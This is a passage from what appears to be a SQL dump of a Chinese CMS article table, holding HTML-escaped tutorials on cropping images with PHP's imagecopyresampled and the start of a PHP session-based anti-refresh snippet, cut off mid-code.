style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;三，imagecopyresampled&lt;/strong&gt;&lt;strong&gt;函数&lt;/strong&gt;&lt;strong&gt;相关资料&lt;/strong&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;说明：&lt;/strong&gt;imagecopyresampled 重采样拷贝部分图像并调整大小&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;原型：&lt;/strong&gt;bool&amp;nbsp;&lt;strong&gt;imagecopyresampled&amp;nbsp;&lt;/strong&gt;( resource dst_image, resource src_image, int dst_x, int dst_y, int src_x, int src_y, int dst_w, int dst_h, int src_w, int src_h )dst_image 和 src_image 分别是目标图像和源图像的标识符。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;其它：imagecopyresampled&lt;/strong&gt;(目标图像，源图像，存宽度，存高度，坐标X，坐标Y，源宽度，源高度) 如果成功则返回 TRUE，失败则返回 FALSE。 imagecopyresampled() 将一幅图像中的一块正方形区域拷贝到另一个图像中，平滑地插入像素值，因此，尤其是，减小了图像的大小而仍然保持了极大的清晰度。如果源和目标的宽度和高度不同，则会进行相应的图像收缩和拉伸。坐标指的是左上角。本函数可用来在同一幅图内部拷贝（如果 dst_image 和 src_image 相同的话）区域，但如果区域交迭的话则结果不可预知。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;注意事项:&lt;/strong&gt;&amp;nbsp;因为调色板图像限制（255+1 种颜色）有个问题。重采样或过滤图像通常需要多于 255 种颜色，计算新的被重采样的像素及其颜色时采用了一种近似值。对调色板图像尝试分配一个新颜色时，如果失败我们选择了计算结果最接近（理论上）的颜色。这并不总是视觉上最接近的颜色。这可能会产生怪异的结果，例如空白（或者视觉上是空白）的图像。要跳过这个问题，请使用真彩色图像作为目标图像，例如用&amp;nbsp;&lt;strong&gt;imagecreatetruecolor&lt;/strong&gt;() 创建的。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;版本要求:&lt;/strong&gt;&amp;nbsp;本函数需要 GD 2.0.1 或更高版本（推荐 2.0.28 及更高版本）。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;strong&gt;四，实现机制：&lt;/strong&gt;&lt;br /&gt;\r\n1，上传图片，注意：使用真彩色图像作为目标图像，用&lt;strong&gt;imagecreatetruecolor&lt;/strong&gt;创建。&lt;br /&gt;\r\n2，使用jQuery插件imgAreaSelect获取截图的坐标信息，如左上角X，左上角Y等。&lt;br /&gt;\r\n3，提交需要截取图像位置信息，使用上面&lt;strong&gt;imagecopyresampled&lt;/strong&gt;函数复制图像，实现截取图像。&lt;br /&gt;\r\n4，保存截取图像。&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:10px;margin-right:0px;margin-bottom:10px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;了解PHP的imagecopyresampled函数的使用，通过PHP实现截图功能就非常简单，结合jQuery的imgAreaSelect插件，轻松实现各种应用功能，如用户自定义头像，复制图片等。&lt;/p&gt;\r\n&lt;/p&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302791130, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(59, 1, 'PHP防恶意刷新代码', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;color:#634463;font-family:consolas, ''courier new'', courier, mono, serif;line-height:22px;&quot;&gt;&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;margin-top:15px;margin-right:30px;margin-bottom:15px;margin-left:30px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;list-style-type:decimal;list-style-position:initial;list-style-image:initial;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;background-color:#ffffff;color:#5c5c5c;&quot;&gt;&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;lt;?php&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;session_start();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$k&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:blue;background-color:inherit;&quot;&gt;''k''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;];&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_GET&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:blue;background-color:inherit;&quot;&gt;''t''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;];&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowTime&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;1800;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:green;background-color:inherit;&quot;&gt;//防刷新时间&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$ip&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;get_client_ip();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowT&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;md5(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$ip&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$k&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$t&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:blue;background-color:inherit;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;(!isset(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowT&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;]))&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$refresh&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;=&amp;nbsp;true;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#ffffff;color:inherit;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_SESSION&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$allowT&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;]&amp;nbsp;=&amp;nbsp;time();&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px !important;margin-right:0px !important;margin-bottom:0px !important;margin-left:0px !important;padding-top:0px !important;padding-right:3px !important;padding-bottom:0px !important;padding-left:10px !important;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:solid;border-width:initial;border-color:initial;list-style-type:decimal-leading-zero;list-style-image:initial;list-style-position:outside !important;border-left-width:3px;border-left-color:#6ce26c;background-color:#f8f8f8;color:#5c5c5c;line-height:14px;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;}&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:blue;background-color:inherit;font-weight:bold;&quot;&gt;elseif&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:black;background-color:inherit;&quot;&gt;(time()&amp;nbsp;-&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;border-top-style:none;border-right-style:none;border-bottom-style:none;border-left-style:none;border-width:initial;border-color:initial;color:#dd0000;background-color:inherit;&quot;&gt;$_SESSION&lt;/span&gt;&lt;span 